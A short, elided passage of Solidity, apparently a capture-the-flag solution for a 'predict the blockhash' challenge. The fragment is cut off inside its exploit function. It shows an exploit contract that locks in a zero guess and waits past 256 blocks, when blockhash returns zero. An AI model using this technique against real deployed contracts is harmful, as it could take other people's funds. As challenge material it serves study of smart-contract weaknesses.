...
contract ExploitContract {
    ...
    error NeedsFunding();
    error NeedToWaitLonger();

    uint256 lastNonZeroBlockhash;
    ...
    function setup() external payable {
        ...
        predictTheBlockhash.lockInGuess{value: 1 ether}(0);

        // blockhash returns 0 after 256 blocks, and the challenge locks in at the next block
        lastNonZeroBlockhash = block.number + 1 + 256;
    }

    function exploit() external {
        if (block.number <= lastNonZeroBlockhash) {
            revert NeedToWaitLonger();
        }
